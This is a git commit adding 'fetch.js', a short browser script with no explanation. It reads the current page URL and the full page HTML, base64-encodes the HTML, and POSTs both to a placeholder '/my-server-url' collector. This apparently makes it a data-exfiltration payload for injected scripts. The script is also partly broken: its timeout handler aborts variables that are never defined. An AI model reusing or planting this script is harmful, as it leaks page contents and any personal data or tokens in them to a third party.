141ce35c540881f80a04c7cf08e799aaeba05034
DIMOOON <68978608+reewardius@users.noreply.github.com>
2023-03-28 11:55:01 +0300

    Create fetch.js

---
+++ fetch.js
@@ -0,0 +1,43 @@
+try {
+  const sendRequest = (method, url, data) => {
+    return fetch(url, {
+      method: method,
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => {
+      if (response.ok) {
+        return response.json();
+      }
+      throw new Error('Request failed!');
+    }, networkError => {
+      console.log(networkError.message);
+    })
+    .catch(error => {
+      console.log(error.message);
+    });
+  }
+
+  const currentUrl = window.location.href;
+  sendRequest('POST', '/my-server-url/currentUrl', {url: currentUrl})
+  .then(data => console.log(data))
+  .catch(error => console.log(error.message));
+
+  const pageHtml = document.documentElement.outerHTML;
+  const pageBase64 = btoa(pageHtml);
+  sendRequest('POST', '/my-server-url/dom', {dom: pageBase64})
+  .then(data => console.log(data))
+  .catch(error => console.log(error.message));
+  
+  // Set timeout for the requests
+  const timeout = setTimeout(function() {
+    xhrUrl.abort();
+    xhrDom.abort();
+    console.log("Request timed out.");
+  }, 5000);
+  
+} catch (error) {
+  console.log(error.message);
+}
